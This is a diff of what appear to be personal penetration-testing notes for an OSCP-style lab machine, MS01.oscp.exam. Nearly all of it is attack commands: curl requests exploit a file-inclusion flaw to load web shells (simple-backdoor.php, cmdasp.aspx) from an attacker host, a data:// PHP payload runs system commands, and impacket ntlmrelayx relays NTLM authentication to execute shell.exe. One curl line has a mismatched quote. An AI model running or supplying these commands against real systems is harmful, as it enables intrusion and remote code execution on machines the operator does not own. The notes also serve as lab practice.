@@ -26,7 +26,12 @@ nmap 192.168.194.147 --script=msrpc-enum
 nbtstat -a 192.168.194.147
 
 # we find that the url param seems to be vulerable to some sort of file inclusion vuln
-curl -X POST --data 'name=test&mail=test@test.com&url=http://192.168.45.219/simple-backdoor.php&cmd=dir" http://MS01.oscp.exam:8080/home/signup
+curl -X POST --data 'name=test&mail=test@test.com&url=http://192.168.45.219/cmdasp.aspx' http://MS01.oscp.exam:8080/home/signup
 
 curl -X POST --data "name=test&mail=test@test.com&url=data://text/plain,<?php%20echo%20system('ls');?>" http://MS01.oscp.exam:8080/home/signup
+
+
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t MS01.oscp.exam -c shell.exe
+
+sudo impacket-smbserver -t MS01.oscp.exam
 ```
